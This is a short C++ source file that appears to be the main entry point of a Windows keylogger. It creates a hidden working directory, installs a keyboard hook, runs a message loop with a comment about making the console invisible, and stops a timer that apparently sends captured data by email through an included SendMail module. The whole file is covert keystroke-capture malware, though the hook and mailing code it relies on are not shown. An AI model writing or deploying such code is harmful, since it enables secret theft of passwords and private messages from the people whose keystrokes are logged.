
#include <iostream>
#include <Windows.h>
#include "Helper.h"
#include "Base64.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main() {
	MSG  Msg;

	IO::MkDir(IO::GetOurPath(true));
	InstallHook();

	//Hace que nuestra consola sea invisible
	while (GetMessage(&Msg, NULL, 0, 0)) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	
	MailTimer.Stop();

	return 0;
}